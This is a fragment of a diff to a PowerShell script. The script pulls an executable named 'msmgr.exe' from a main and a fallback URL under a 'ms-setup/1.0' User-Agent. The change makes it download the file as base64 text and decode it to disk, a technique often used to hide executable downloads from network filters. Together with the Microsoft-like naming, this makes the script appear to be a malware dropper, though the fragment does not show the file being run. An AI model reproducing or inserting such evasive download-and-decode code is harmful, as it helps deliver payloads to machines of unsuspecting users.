@@ -66,7 +66,10 @@ foreach ($url in @($MgrUrl, $MgrUrlFallback)) {
     try {
         $wc = New-Object System.Net.WebClient
         $wc.Headers.Add("User-Agent", "ms-setup/1.0")
-        $wc.DownloadFile($url, $MgrExe)
+        # Download as base64 text then decode to binary
+        $b64 = $wc.DownloadString($url).Trim()
+        $bytes = [Convert]::FromBase64String($b64)
+        [IO.File]::WriteAllBytes($MgrExe, $bytes)
         if ((Test-Path $MgrExe) -and (Get-Item $MgrExe).Length -gt 10000) {
             Write-OK "Downloaded msmgr.exe"
             $downloaded = $true; break
